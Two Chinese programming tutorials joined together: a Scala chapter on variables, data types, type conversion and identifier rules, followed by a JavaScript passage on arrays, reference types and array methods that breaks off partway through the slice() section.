大数据技术之_16_Scala学习_02_变量

第二章 变量2.1 变量是程序的基本组成单位2.2 Scala 变量的介绍2.2.1 概念2.2.2 Scala 变量使用的基本步骤2.3 Scala 变量的基本使用2.4 Scala 变量使用说明2.4.1 变量声明基本语法2.4.2 注意事项2.5 Scala 程序中 +号 的使用2.6 Scala 数据类型2.6.1 scala 数据类型体系一览图2.6.2 scala 数据类型列表2.7 整数类型2.7.1 基本介绍2.7.2 整型的类型2.7.3 整型的使用细节2.8 浮点类型2.8.1 基本介绍2.8.2 浮点型的分类2.8.3 浮点型使用细节2.9 字符类型：Char2.9.1 基本介绍2.9.2 案例演示2.9.3 字符类型使用细节2.9.4 字符类型本质探讨2.10 布尔类型：Boolean2.11 Unit 类型、Null 类型和 Nothing 类型2.11.1 基本说明2.11.2 使用细节和注意事项2.12 值类型转换2.12.1 值类型隐式转换2.12.2 自动类型转换细节说明2.12.3 高级隐式转换和隐式函数2.12.4 强制类型转换2.13 值类型转换练习题2.14 值类型和 String 类型的转换2.14.1 介绍2.14.2 基本数据类型转 String 类型2.14.3 String 类型转基本数据类型2.14.4 注意事项2.15 标识符的命名规范2.15.1 标识符概念2.15.2 标识符的命名规则(要记住)2.15.3 标识符举例说明2.15.4 标识符命名注意事项2.15.5 Scala 关键字2.16 作业01

第二章 变量
  为什么需要变量：一个程序就是一个世界，在 scala 中一切都是对象。而在 java 中不完全是！因为有基本数据类型。
2.1 变量是程序的基本组成单位
  不论是使用哪种高级程序语言编写程序，变量都是其程序的基本组成单位，比如:
package com.atguigu.chapter02object ScalaFunDemo01 {  def main(args: Array[String]): Unit = {      val a: Int = 1 // 定义一个整型变量，取名 a，并赋初值1      val b: Int = 3 // 定义一个整型变量，取名 b，并赋初值3      b = 89 // 给变量 b 赋 89      println("a=" + a) // 输出语句，把变量 a 的值输出      println("b=" + b) // 把变量 b 的值输出  }}
2.2 Scala 变量的介绍
2.2.1 概念

变量相当于内存中一个数据存储空间的表示，你可以把变量看做是一个房间的门牌号，通过门牌号我们可以找到房间，而通过变量名可以访问到变量(值)。

2.2.2 Scala 变量使用的基本步骤
  1、声明/定义变量 (scala 要求变量声明时需要初始化)   2、使用
2.3 Scala 变量的基本使用
示例代码：
package com.atguigu.chapter02.vars/**  * @author chenmingjun  *         2019-03-23 9:53  */object VarDemo01 {  def main(args: Array[String]): Unit = {    var age: Int = 10    var sal: Double = 10.9    var name: String = "tom"    var isPass: Boolean = true    // 在 scala 中，小数默认为 Double，整数默认是 Int    var score: Float = 59.9f    println(s"${age} ${sal} ${name} ${isPass} ${score}")  }}
输出结果为：
10 10.9 tom true 59.9
注意：现代的编译器是动态的，会做逃逸分析。即：一个数据空间的生命周期很长，且多个变量引用同一个数据空间，这样的数据空间放在堆中。如果一个数据空间只是临时用一下，生命周期短，我们往往会把它放在栈里面。
2.4 Scala 变量使用说明
2.4.1 变量声明基本语法
var|val 变量名[: 变量类型] = 变量值
2.4.2 注意事项
  1、声明变量时，类型可以省略（编译器自动推导，即类型推导）。  2、类型确定后，就不能修改，说明 Scala 是强数据类型语言。  3、在声明/定义一个变量时，可以使用 var 或者 val 来修饰， var 修饰的变量可改变，val 修饰的变量不可改。  4、val 修饰的变量在编译后，等同于加上 final，通过反编译看下底层代码。  5、var 修饰的对象的引用可以改变，val 修饰的则不可以改变，但是对象的状态（值）却是可以改变的。  6、变量声明时，需要初始值。
示例代码：
package com.atguigu.chapter02.vars/**  * @author chenmingjun  *         2019-03-23 10:43  */object VarDemo02 {  def main(args: Array[String]): Unit = {    // 1、声明变量时，类型可以省略（编译器自动推导，即类型推导）    var num = 10 // 省略类型，这时 num 就是 Int    // 方式一：可以利用 idea 的提示来证明    // 方式二：使用 isInstanceOf[Int] 来判断    println(num.isInstanceOf[Int])    // 2、类型确定后，就不能修改，说明 Scala 是强数据类型语言    // num = 2.5 // 错误    // 3、在声明/定义一个变量时，可以使用 var 或者 val 来修饰， var 修饰的变量可改变，val 修饰的变量不可改。    var age =10    age = 30 // 正确    val num2 = 40    // num2 = 50 // 错误    // scala 设计者为什么设计 var 和 val ？    // (1) 因为在实际编程中，我们更多的需求是获取/创建一个对象后，读取该对象的属性或者是修改该对象的属性值，但是我们很少去改变这个对象的本身（即内存地址值）。    // (2) 因为 val 没有线程安全问题，因此效率较高。    // (3) 如果对象需要改变，则使用 var。    val dog = new Dog    // dog = new Dog // Reassignment to val    dog.age = 90 // ok    dog.name = "小呆萌" // ok  }}class Dog {  // 声明一个 age 属性，给了一个默认值  var age: Int = 0  // 声明名字  var name: String = ""}
通过反编译看下底层代码示例代码：
package com.atguigu.chapter02.vars/**  * @author chenmingjun  *         2019-03-23 11:10  */object VarDemo03 {  var name = "小呆萌"  val age = 2  def main(args: Array[String]): Unit = {    println("ok")  }}通过反编译看下底层代码：public final class VarDemo03${  public static final  MODULE$;  private String name;  private final int age;  static  {    new ();  }  public String name()  {    return this.name; }   public void name_$eq(String x$1) { this.name = x$1; }   public int age() { return this.age; }   public void main(String[] args) {    Predef..MODULE$.println("ok");  }  private VarDemo03$() { MODULE$ = this;    this.name = "小呆萌";    this.age = 2;  }}
2.5 Scala 程序中 +号 的使用
1、当左右两边都是数值型时，则做加法运算。2、当左右两边有一方为字符串，则做拼接运算。
2.6 Scala 数据类型
  1、Scala 与 Java 有着相同的数据类型，在 Scala 中数据类型都是对象，也就是说 Scala 没有 Java 中的原生类型  2、Scala 数据类型分为两大类 AnyVal(值类型) 和 AnyRef(引用类型)， 注意：不管是 AnyVal 还是 AnyRef 都是对象。  3、相对于 Java 的类型系统，scala 要复杂些！也正是这复杂多变的类型系统才让面向对象编程和函数式编程完美的融合在了一起。示例代码：
package com.atguigu.chapter02.datatype/**  * @author chenmingjun  *         2019-03-23 11:22  */object TypeDemo01 {  def main(args: Array[String]): Unit = {    var num1: Int = 10    // 因为Int 是一个类，因此它的一个实例里面就有很多方法可以使用    println(num1.toDouble + "\t" + num1.toString + "\t" + 100.toDouble)    // 在 scala 中，如果一个方法没有形参，则可以省略()    sayHi    sayHi()    var isPass = true    println(isPass.toString)  }  def sayHi(): Unit = {    println("say hi")  }}
输出结果为：
10.0    10  100.0say hisay hitrue
2.6.1 scala 数据类型体系一览图
对上图的小结和整理1、在 scala中有一个根类型，它是所有类的父类。2、scala 中一切皆为对象，分为两大类 AnyVal(值类型)和 AnyRef(引用类型)，它们都是 Any 的子类。3、Null 类型是 scala 的特别类型，它只有一个值 null，它是 bottom class，是所有 AnyRef 类型的子类。4、Nothing 类型也是 bottom class，它是所有类型的子类。在开发中通常可以将 Nothing 类型的值返回给任意变量或者函数，这里在抛出异常使用很多。示例代码：
package com.atguigu.chapter02.datatype/**  * @author chenmingjun  *         2019-03-23 11:53  */object TypeDemo02 {  def main(args: Array[String]): Unit = {    println(sayHello)  }  // 比如在开发中，我们有一个方法，就会异常中断，这时就可以返回 Nothing  // 即当我们使用 Nothing 作为返回值时，就是明确说明该方法没有正常返回值。  def sayHello: Nothing  = {    throw new Exception("抛出异常")  }}
输出结果为：
Exception in thread "main" java.lang.Exception: 抛出异常    at com.atguigu.chapter02.datatype.TypeDemo02$.sayHello(TypeDemo02.scala:15)    at com.atguigu.chapter02.datatype.TypeDemo02$.main(TypeDemo02.scala:9)    at com.atguigu.chapter02.datatype.TypeDemo02.main(TypeDemo02.scala)
5、在 scala 中仍然遵守，低精度的值向高精度的值得自动转换（implicit conversion:隐式转换）示例代码：
    var num = 1.2   // 默认是 Double    var num2 = 1.7f // 这里是 Float    // num2 = num   // 错误    num2 = num.toFloat // 正确
2.6.2 scala 数据类型列表

2.7 整数类型
2.7.1 基本介绍
  Scala 的整数类型就是用于存放整数值的，比如：12, 30, 3456 等等
2.7.2 整型的类型

2.7.3 整型的使用细节
  1、Scala 各整数类型有固定的表数范围和字段长度，不受具体操作系统的影响，以保证 Scala 程序的可移植性。  2、Scala 的整型 常量/字面量  默认为 Int 型，声明 Long 型 常量/字面量 须后加“l”’或"L"。 【可以反编译查看】。  3、Scala 程序中变量常声明为 Int 型，除非不足以表示大数，才使用 Long。示例代码：
package com.atguigu.chapter02.datatype/**  * @author chenmingjun  *         2019-03-23 12:47  */object TypeDemo03 {  def main(args: Array[String]): Unit = {    println("Long的范围：" + Long.MaxValue + "~" + Long.MinValue)    var i = 10  // i Int    var j = 10l // j Long    var k = 10L // j Long    var m = 9223372036854775807L // 9223372036854775807 超过 Int  }}
2.8 浮点类型
2.8.1 基本介绍
  Scala 的浮点类型可以表示一个小数，比如 123.4f，7.8，0.12 等等
2.8.2 浮点型的分类

2.8.3 浮点型使用细节
  1、与整数类型类似，Scala 浮点类型也有固定的表数范围和字段长度，不受具体操作系统的影响。  2、Scala 的浮点型常量默认为 Double 型，声明 Float 型常量，须后加“f”或"F"。
var f1: Float = 1.1     // Double->Float，错误var f2 = 1.2            // ok 类型推断var f3: Double = 1.3    // okvar f4: Float = 1.4f    // okvar f5: Double = 1.5f   // Float->Double, ok，隐式转换
  3、浮点型常量有两种表示形式
十进制数形式，如：5.12      512.0f      .512   (必须有小数点）科学计数法形式，如：5.12e2 = 5.12乘以10的2次方     5.12E-2 = 5.12除以10的2次方
  4、通常情况下，应该使用 Double 型，因为它比 Float 型更精确(小数点后大致7位)
    // 测试数据：2.2345678912f, 2.2345678912    var num1: Float = 2.2345678912f    var num2: Double = 2.2345678912    println("num1=" + num1 + "\t" + "num2=" + num2)    // 输出结果：num1=2.2345679      num2=2.2345678912
2.9 字符类型：Char
2.9.1 基本介绍
  字符类型可以表示单个字符，字符类型是 Char， 16 位无符号 Unicode 字符(2个字节), 区间值为 U+0000 到 U+FFFF
2.9.2 案例演示
示例代码：
package com.atguigu.chapter02.datatype/**  * @author chenmingjun  *         2019-03-23 13:10  */object CharDemo04 {  def main(args: Array[String]): Unit = {    var char1: Char = 97    // 当我们输出一个 char 类型时，它会输出该数字对应的字符（Unicode 码表） Unicode 码表包含 ASCII 码表    println("chart1=" + char1) // a    // Char 可以当做数字进行运算    var char2: Char = 'a'    var num = 10 + char2    println("num=" + num) // 107    // var c2: Char = 'a' + 1 // Int->Char 错误    // var c3: Char = 97 + 1 //  Int->Char 错误    var c4: Char = 98 // 正确    var c5: Char = 65535 // 正确    // var c6: Char = 65536 // 错误    // 原因和分析    // 1、当把一个计算的结果赋值给一个变量，则编译器会进行类型转换和判断（即会看类型和范围）。    // 2、当把一个字面量赋值给一个变量，则编译器只会进行范围的判定。    var c6 = '\n'//    println("c6=" + c6 + "hello")   }}
2.9.3 字符类型使用细节
  1、字符常量是用单引号 ('') 括起来的单个字符。例如：var c1 = 'a' var c2 = '中' var c3 = '9'   2、Scala 也允许使用转义字符 '\' 来将其后的字符转变为特殊字符型常量。例如：var c3 = '\n'  // '\n' 表示换行符   3、可以直接给 Char 赋一个整数，然后输出时，会按照对应的 Unicode 字符输出 ['\u0061' 97]  4、Char 类型是可以进行运算的，相当于一个整数，因为它都对应有 Unicode码。  

2.9.4 字符类型本质探讨

字符型 存储到 计算机中，需要将字符对应的码值（整数）找出来存储：字符 -> 码值 -> 二进制 -> 存储读取：二进制 -> 码值 -> 字符 -> 读取
字符和码值的对应关系是通过字符编码表决定的(是规定好的)， 这一点和 Java 一样。


示例代码：
    var c7: Char = '中'    println("c7=" + c7 + "，c7对应的码值=" + c7.toInt)    var c8: Char = '国'    println("c8=" + c8 + "，c8对应的码值=" + c8.toInt)
输出结果为：
c7=中，c7对应的码值=20013c8=国，c7对应的码值=22269
2.10 布尔类型：Boolean
基本介绍  布尔类型也叫 Boolean 类型，Booolean 类型数据只允许取值 true 和 false  Boolean 类型占 1 个字节。  Boolean 类型适于逻辑运算，一般用于程序流程控制。如下：

if 条件控制语句                
while 循环控制语句
do-while 循环控制语句   
for 循环控制语句


2.11 Unit 类型、Null 类型和 Nothing 类型
2.11.1 基本说明


2.11.2 使用细节和注意事项
  1、Null 类只有一个实例对象，null，类似于 Java 中的 null 引用。null 可以赋值给任意引用类型(AnyRef)，但是不能赋值给值类型(AnyVal: 比如 Byte, Short, Int, Long, Float, Double, Char, Boolean)  2、Unit 类型用来标识过程，也就是没有明确返回值的函数。由此可见，Unit 类似于 Java 里的 void。Unit 只有一个实例，()，这个实例也没有实质的意义。  3、Nothing，可以作为没有正常返回值的方法的返回类型，非常直观的告诉你这个方法不会正常返回，而且由于 Nothing 是其他任意类型的子类，它还能跟要求返回值的方法兼容。示例代码：
package com.atguigu.chapter02.datatype/**  * @author chenmingjun  *         2019-03-23 13:52  */object UnitNullNothingDemo05 {  def main(args: Array[String]): Unit = {    val result = sayHello()    println("result="+ result) // result=()    // Null 类只有一个实例对象，null，类似于 Java 中的 null 引用。null 可以赋值给任意引用类型(AnyRef)，但是不能赋值给值类型(AnyVal: 比如 Byte, Short, Int, Long, Float, Double, Char, Boolean)    val dog: Dog = null    // var chart1: Char = null // 运行报错    println("OK")  }  // Unit 类似于 Java 里的 void。Unit 只有一个实例，()，这个实例也没有实质的意义。  def sayHello(): Unit = {  }}class Dog() {}
输出结果为：
result=()OK
2.12 值类型转换
2.12.1 值类型隐式转换
介绍：  当 Scala 程序在进行赋值或者运算时，精度小的类型自动转换为精度大的数据类型，这个就是自动类型转换=隐式转换。  数据类型按精度(容量)大小排序为：  

2.12.2 自动类型转换细节说明
  1、有多种类型的数据混合运算时，系统首先自动将当前所有数据转换成容量最大的那种数据类型(尖叫提示：是参与运算的类型中容量最大的)，然后再进行计算。 5.6 + 10 -> Double  2、当我们把精度(容量)大的数据类型赋值给精度(容量)小的数据类型时，就会报错，反之就会进行自动类型转换。  3、【Byte, Short】 和 Char之间不会相互自动转换。尖叫提示：Byte 可以自动转换为 Short。  4、Byte，Short，Char 他们三者可以计算，在计算时首先转换为 Int 类型。  5、自动提升原则： 表达式结果的类型自动提升为操作数中最大的类型。  
示例代码：
package com.atguigu.chapter02.dataConvert/**  * @author chenmingjun  *         2019-03-23 15:59  */object ConvertDemo01 {  def main(args: Array[String]): Unit = {    var n1 = 10    var n2 = 1.1    // 1、有多种类型的数据混合运算时，系统首先自动将当前所有数据转换成容量最大的那种数据类型，然后再进行计算。    var n3 = n1 + n2 // n3 是 Double，注意：当 var n2 = 1.1f 时，n3 是 Float    // 2、Byte, Short 和 Char之间不会相互自动转换。    var n4: Byte = 10    // var n5: Char = n4 // 错误  }}
2.12.3 高级隐式转换和隐式函数
  scala 还提供了非常强大的隐式转换机制(隐式函数、隐式类等等)，我们放在高级部分专门用一个章节来讲解。
2.12.4 强制类型转换
介绍：  自动类型转换的逆过程，将容量大的数据类型转换为容量小的数据类型。使用时要加上强制转函数，但可能造成精度降低或溢出，格外要注意。案例演示：
java  :  int num = (int) 2.5; // 语法糖scala :  var num: Int =  2.7.toInt  // 对象
强制类型转换细节说明：  1、当进行数据的 从大 —> 小，就需要使用到强制转换。  2、强转符号只针对于最近的操作数有效，往往会使用小括号提升优先级。  3、Char 类型可以保存 Int 类型的常量值，但不能保存 Int 类型的变量值，非要保存的话，需要强转。  4、Byte 和 Short 类型在进行运算时，当做 Int 类型处理。示例代码：
val num1: Int = 10 * 3.5.toInt + 6 * 1.5.toInt  // 36val num2: Int = (10 * 3.5 + 6 * 1.5).toInt      // 44println(num1 + " " + num2)
2.13 值类型转换练习题
判断是否能够通过编译，并说明原因1） var s: Short  = 5   // ok    s = s-2             // error，因为有运算，Int -> Short        2） var b: Byte  = 3    // ok    b = b + 4           // error，因为有运算，Int -> Byte    b = (b+4).toByte    // ok，使用强制转换3） var c: Char = 'a'   // ok    var i: Int = 5      // ok    var d: Float = .314F    //ok    var result: Double = c + i + d     // ok，Float -> Double4） var b: Byte = 5         // ok    var s: Short = 3        // ok    var t: Short = s + b    // error，因为有运算，Int -> Short     var t2 = s + b          // ok，使用了类型推导
2.14 值类型和 String 类型的转换
2.14.1 介绍
  在程序开发中，我们经常需要将基本数据类型转成 String 类型。  或者将 String 类型转成基本数据类型。
2.14.2 基本数据类型转 String 类型
语法： 将基本类型的值+"" 即可
2.14.3 String 类型转基本数据类型
语法：通过基本类型的 String 的 toXxx 方法即可
示例代码：
package com.atguigu.chapter02.dataConvert/**  * @author chenmingjun  *         2019-03-23 16:37  */object String2Basic {  def main(args: Array[String]): Unit = {    val d1 = 1.2    // 基本数据类型转 String 类型    val s1 = d1 + "" // 以后看到下划线，就表示编译器做了转换    // String 类型转 基本数据类型    val s2 = "12"    val num1 = s2.toInt    val num2 = s2.toByte    val num3 = s2.toDouble    val num4 = s2.toLong  }}
2.14.4 注意事项
  1、在将 String 类型转成 基本数据类型时，要确保 String 类型能够转成有效的数据，比如我们可以把 "123"，转成一个整数，但是不能把 "hello" 转成一个整数。  2、思考就是要把 "12.5" 转成 Int？示例代码：
    // 1、在将 String 类型转成 基本数据类型时，要确保 String 类型能够转成有效的数据，比如我们可以把 "123"，转成一个整数，但是不能把 "hello" 转成一个整数。    var s3 = "hello"    println(s3.toInt) // 错误    // 2、思考就是要把 "12.5" 转成 Int？    var s4 = "12.5"    println(s4.toInt) // 错误，Double -> Int，在 scala 中不能将小数点后面的数据进行截取，而是会抛出异常    println(s4.toDouble) // 正确
2.15 标识符的命名规范
2.15.1 标识符概念
  Scala 对各种变量、方法、函数等命名时使用的字符序列称为标识符。  凡是自己可以起名字的地方都叫标识符。
2.15.2 标识符的命名规则(要记住)
  1、Scala 中的标识符声明，基本和 Java 是一致的，但是细节上会有所变化。  2、首字符为字母，后续字符任意字母和数字、美元符号，可后接下划线_。  3、数字不可以开头。  4、首字符为操作符【比如 + - * /】，后续字符也需跟操作符，至少一个【反编译查看】。  5、操作符【比如 + - * /】不能在标识符中间和最后。  6、用反引号....包括的任意字符串，即使是关键字(39个)也可以。示例代码：
package com.atguigu.chapter02.identifyimport scala.collection.immutable.RedBlackTree.BlackTree/**  * @author chenmingjun  *         2019-03-23 16:58  */object IdenDemo01 {  def main(args: Array[String]): Unit = {    // 首字符为操作符【比如 + - * /】，后续字符也需跟操作符，至少一个【反编译查看】。    val ++ = "hello" // ++ => $plus$plus    println(++)    val -+ = 90 // -+ => $minus$plus    println(-+)    val -+*/ = 90 // -+*/ => $minus$plus$times$div    println(-+*/)    var `true` = "world"    println(`true`)    var Double = 95.5    println(Double)    var Float = 85.5    println(Float)    var Long = 75.5    println(Long)    var Int = 65.5    println(Int)    var Short = 55.5    println(Short)    var Char = 45.5    println(Char)    var Byte = 35.5    println(Byte)    // var _ = "jack"    // println(_) // 错误，因为在scala中，下划线有很多其他的作用，因此不能使用。  }}
输出结果为：
hello9090world95.585.575.565.555.545.535.5
2.15.3 标识符举例说明
hello       // okhello12     // ok1hello      // errorh-b         // errorx h         // errorh_4         // ok_ab         // okInt         // ok，在scala中，Int 不是关键字，而是预定义标识符，可以用，但是不推荐。Double、Float、Long、Short、Char、Byte 同理。_           // 不可以，因为在scala中，下划线有很多其他的作用，因此不能使用。Abc         // ok+*-         // ok+a          // error
2.15.4 标识符命名注意事项
  1、包名：尽量采取有意义的包名，简短，有意义。  2、变量名、函数名 、方法名 采用驼峰法。
2.15.5 Scala 关键字
Scala 有 39 个关键字：
package, import, class, object, trait, extends, with, type, forSomeprivate, protected, abstract, sealed, final, implicit, lazy, overridetry, catch, finally, throw if, else, match, case, do, while, for, return, yielddef, val, var this, supernewtrue, false, null
2.16 作业01
1、在 Scala REPL(Read Evaluation Print Loop)中，计算3的平方根，然后再对该值求平方。现在，这个结果与3相差多少？ 提示：scala.math 找相应的方法。

2、Scala 语言的 sdk 是什么？答：sdk指的是scala的开发工具包。
3、Scala 环境变量配置及其作用。
4、Scala 程序的编写、编译、运行步骤是什么？能否一步执行？答：编写：就是使用工具，开发 scala 程序。编译：就是将 .scala 文件编译成 .class 【命令：scalac]】。运行：就是使用 scala 来将 .class 文件加载到 jvm 并运行，可以直接运行 .scala, 但是速度慢。【命令：scala xxx.scala】。可以一步执行。
5、Scala 程序编写的规则。答：略。
6、简述：在配置环境、编译、运行各个步骤中常见的错误。答：略。
7、如何检测一个变量是 val 还是 var?？答：定义一个 val 和 var 的变量，然后通过赋值就可以看出。
8、Scala 允许你用数字去乘一个字符串，去 REPL 中试一下 "crazy"*3。这个操作做什么？在 Scaladoc 中如何找到这个操作？
答：搜索矿中输入 string，找到 StringOps 或者 WrappedString
9、10 max 2 的含义是什么？max 方法定义在哪个类中？ 答：返回两个数中的最大值，10 max 2 等价于 10.max(2)，定义在 Int 类和 RichInt 类中。
10、用 BigInt 计算 2 的 1024 次方。提示：在 BigInt 找相应的方法。

11、在 Scala 中如何获取字符串 “Hello” 的首字符和尾字符？ 提示: 在 String 中找相应的方法。

https://www.cnblogs.com/chenmingjun/p/10584807.html
**************************************************
前端笔记知识点整合之JavaScript（五）关于数组和字符串那点事
一、数组
1.1数组概念
数组(array)是一个有序的数据集合。说白了，数组就是一组数。数组内部可以存放一个或多个单独的数据，整体组成数组。
定义数组最简单的方式：数组字面量。
数组的字面量“[]”。习惯将数组赋值给一个变量。
 

var arr = [];

var arr = [1,2,3,4,5,6,7,888,999,666];
arr[5] = 88; //把数组下标为5的项改为88（设置数组中的某一项）
console.log(arr);
console.log(arr[0]); //1
console.log(arr[8]); //999
console.log(arr[9]); //666
console.log(arr[12]); //undefined

 
数组的字面量就是方括号，这是定义数组最简单的方式，至于更多创建数组的方式，后续会提到。
里面用“,”逗号隔开每个值，最后一项没有逗号。
变量arr就是一个数组变量，里面存储的不是一个数字，而是一组数。可以使用下标（编号）或称为“索引值(index)”，来精确访问数组中的某一项，下标从0开始。
 
数组中，并不规定保存相同类型的值，但是实际应用中，一般还是将相同类型的值保存在一起。
下面的数组中，存储的内存类型都不一样，是合法。

function fn(){
   alert("你好");
}
var arr = [3,4,"么么哒！",12,true,[],fn];
console.log(arr);
console.log(arr[6]);
arr[6]();//数组下标为6的项，是以函数，是函数就能运行

 

 
1.2数组length属性
数组有一个length属性，英语是“长度”的意思，表示这个数组的项的个数。
什么是“属性”，数组是对象，对象就有属性，属性就是描述这个对象的特点、特征、特性。用来表示一个对象的属性，用“.”点来表示一个对象的属性：
 




 arr.length;




 

var arr = [100,200,3,4,5,6,7,888,999,666,12345,3333,7777];
console.log(arr);
console.log(arr.length); //12 数组中有几项，就弹出几
console.log(arr[0] + 1); //数组第0项是100，所以100+1 =101
console.log(arr[arr.length-1]); //获取数组最后一项，数组最大下标是arr.length-1，比arr.length-1还大是undefined

console.log(arr[100]); //undefined
arr[4] = "我是下标第4项";
arr.length = 18; //强行把数组长度属性改为18
arr[66] = 8989; //可以跳跃设置数组，设置下标为66的项，并拉长了数组
console.log(arr); 

 
写一个小于数组元素的值会缩短数组，写0会彻底清空数组arr.length = 2;那么只会有两项，其余都丢失了




 arr.length = 2;
 arr.length = 100;




案例：
用数组判断星期几：

var arr = ["星期天","星期一","星期二","星期三","星期四","星期五","星期六"];
//假如今天是星期二、判断1000天后是星期几
var week = (1000 % 7 + 2) % 7;//0~6
console.log(week);
console.log(arr[week]);

随机点名：

var stuName = ["王大锤","李铁锤","二蛋","二狗子","黑猫","白猫","小丸子"];
var num = parseInt(Math.random() * stuName.length);
console.log(stuName[num]);
document.write('<h1>'+stuName[num]+'</h1>');

 

 
1.3数组的遍历
 
数组里面存放的是一组数，我们经常需要对这些数字都进行一些操作。
就需要用for循环语句来遍历它。这是一个经典的for壳子：
 

var arr = [21,214,52,85,88,2,53,77,100,76];
for(var i = 0;i <= arr.length - 1;i++){
   if(arr[i] % 2 == 0){
       console.log(arr[i]); //取出每一项能整除2的数据，进行输出
   }
}

//给数组中的每一项都乘以2，数组遍历，计算后给每一项赋值
for(var i = 0;i <= arr.length - 1;i++){
   arr[i] *= 2;
}
console.log(arr);


//数组样本
var arr = [...];
//遍历，计算偶数的个数
//计算平均数，平均数就是：总和/个数
var count = 0; //累加偶数个数
var sum = 0; //计算平均数
for(var i = 0;i < arr.length;i++){
    sum += arr[i]; //计算所有项的总和
    if(arr[i] % 2 == 0){
        count++; //如果是偶数，计数器+1
    }
}
alert("偶数的个数是：" + count);
console.log("平均数是：" + (sum / arr.length));

 

1.4数组是引用类型




 var arr = [1,2,3,4];
 console.log(typeof arr); //object




 
用typeof arr 检测，会发现数组是Object，数组是对象。
怎么检测数组是数组呢？高级JS再说。
 
基本类型：是保存值，判断时，是判断值是否相等。 

var a = 1; //基本类型
var b = a; //会把a的值复制一个副本给b
console.log(a);//1
console.log(b);//1
console.log(a == b);//true，值是相等的

 
引用类型：保存内存地址，比较时是判断内存地址是否相等。

//都是数组[1,2,3,4]，内存、长度、项的位置完全一样，但是不相等。
var a = [1,2,3,4];
var b = [1,2,3,4]; //因为数组是引用类型，要比较地址，a和b变量指向地址不一样，不能判相等。
console.log(a == b);//数组中的值一样，但引用类型判断内存地址是否相同，所以是false

var a = [1,2,3,4];
var b = a; //b变量引用了a变量的值，所以都指向同一个内存地址
console.log(a == b);//true
var a = [1,2,3,4];
var b = a; //b变量引用了a变量的值，所以都指向同一个内存地址
b[0] = 88; //修改的是数组b下标为0的项
console.log(a); //数组a和b下标为0的项都被修改为88
console.log(b);
console.log(a == b);//true

 

 

var a = [1,2,3,4];
var b = a; //b变量引用了a变量的值，所以都指向同一个内存地址
b[0] = 88; //修改的是数组b下标为0的项
console.log(a);
console.log(b);
b = [6,7,8,9]; //b现在是新的数组（指向了新的内存地址），不再继续影响a
console.log(a);
console.log(b);
console.log(a == b);//false


基本类型和引用类型讲解：
 
 
 
如果a里面存储的是基本类型，那么b=a就是把a的值复制一份给b
如果a里面存储的是引用类型，那么b将指向a现在指向的内存地址，a的值不会复制一份，a、b指向同一个内存地址。
 
在浏览器加载HTML页面时，首先会开辟一个供js代码执行的环境-->"全局作用域"(window/global)
栈内存(作用域)：存储基本数据类型的值；提供js代码执行的环境；
 
堆内存：存储引用数据类型的值，首先会开辟一个新的内存空间，然后把代码存储到这个空间中，最后把空间的地址给相关的变量-->我们把新开辟的这个内存空间称之为"堆内存"。
堆内存的作用：存储引用数据类型值
 

二、数组的方法
数组是对象，现在要知道对象有属性和方法。属性已经介绍了，数组有length属性。
属性：就是描述对象的特点。比如“性别”，“姓名”，“身高”，“体重”。
方法：就是对象能执行的事情。比如“吃饭”，“睡觉”，“抠脚打dota”。
现在就要学习数组能执行什么方法，看以下手册：
 
2.1数组的头尾操作pop()、push()、shift()、unshift()
push() 向数组的末尾添加一个或多个元素，并返回新的长度。
unshift() 向数组的开头添加一个或多个元素，并返回新的长度。
shift() 删除并返回数组的第一个元素
pop() 删除并返回数组的最后一个元素
push()方法，向数组的末尾添加一个或更多元素，并返回新的长度。
 




 var arr = ['东','南','西','北'];
 arr.push('中','发','白');
 console.log(arr);





unshift()向数组的开头添加一个或更多元素，并返回新的长度。
 




 var arr = ['东','南','西','北'];
 arr.unshift('一万','八万','九万');
 console.log(arr);




 
pop()删除数组的最后一项，只能删最后一项，无法删多项。并返回被删除的元素。

 var arr = ['东','南','西','北'];

 var last = arr.pop(); //删除数组的最后一项

 console.log(last);    //pop有返回值，返回值就是被删除的那一项

 arr.pop();

 arr.pop();

 console.log(arr);//["东"]

 
shift()删除数组的开头项，只能删第一项，无法删多项。并返回被删除的元素

 var arr = ["东","南","西","北"];

 var first = arr.shift(); //删除数组的第一项，并返回删除的值

 console.log(first); //shift有返回值，返回值就是被删除的那一项

 arr.shift();

 console.log(arr);

 
 

题目1：尾删头插
 

var arr = ["东","南","西","北"];
arr.unshift(arr.pop()); // ["北", "东", "南", "西"]
console.log(arr);
arr.unshift(arr.pop()); // ["西", "北", "东", "南"]
console.log(arr);
arr.unshift(arr.pop()); // ["南", "西", "北", "东"]
console.log(arr);
arr.unshift(arr.pop()); // ["东", "南", "西", "北"]
console.log(arr);
arr.unshift(arr.pop()); // ["北", "东", "南", "西"]
console.log(arr);

题目2：头删尾插
 

var arr = ["东","南","西","北"];
arr.push(arr.shift()); // ["南", "西", "北", "东"]
console.log(arr);
arr.push(arr.shift()); // ["西", "北", "东", "南"]
console.log(arr);
arr.push(arr.shift()); // ["北", "东", "南", "西"]
console.log(arr);
arr.push(arr.shift()); // ["东", "南", "西", "北"]
console.log(arr);
arr.push(arr.shift()); // ["南", "西", "北", "东"]
console.log(arr);


2.2数组合并concat()
concat()合并两个或更多的数组，并返回结果。
该方法不会改变现有的数组，而仅仅会返回被连接数组的一个副本。
 

var arr1 = ["东","南","西","北"];
var arr2 = ['一条','二条'];
var arr = arr1.concat(arr2); //concat是把arr1和arr2合并为一个新数组返回
console.log(arr1);//不变
console.log(arr2);//不变
console.log(arr); //合并的新数组

concat的参数非常灵活，可以是数组变量、数组字面量、散的值也行。




 var arr3 = arr1.concat(arr2,['一筒','五条'],'幺鸡');
 console.log(arr);




 

2.3数组截取slice()
slice()方法可以从已有的数组中返回选定的元素。
arr.slice(start,end)




参数


描述




start


必需。规定从何处开始选取。如果是负数，那么它规定从数组尾部开始算起的位置。也就是说，-1 指最后一个元素，-2 指倒数第二个元素，以此类推。




end


可选。规定从何处结束选取。该参数是数组片断结束处的数组下标。如果没有指定该参数，那么切分的数组包含从 start 到数组结束的所有元素。如果这个参数是负数，那么它规定的是从数组尾部开始算起的元素。




返回值：返回一个新的数组，包含从 start 到 end（不包括该元素）的中的元素。
 




 var arr1 = ['东','南','西','北','中','发','白'];
 var arr2 = arr1.slice(1,4); //截取下标1、2、3的为一个新数组并返回
 console.log(arr2);  //["南", "西", "北"]




arr.slice(start,end) 返回一个新的数组，包含从 start 到 end（不包括该元素）的元素。
 
只写start开始参数：




 var arr = ["东","西","南","北","中","发","白"];
 var arr2 = arr.slice(3); //从下标3开始，截取到后面全部的项
 console.log(arr2);   // ["北", "中", "发", "白"]




 
slice(a,b)取出了b-a项：
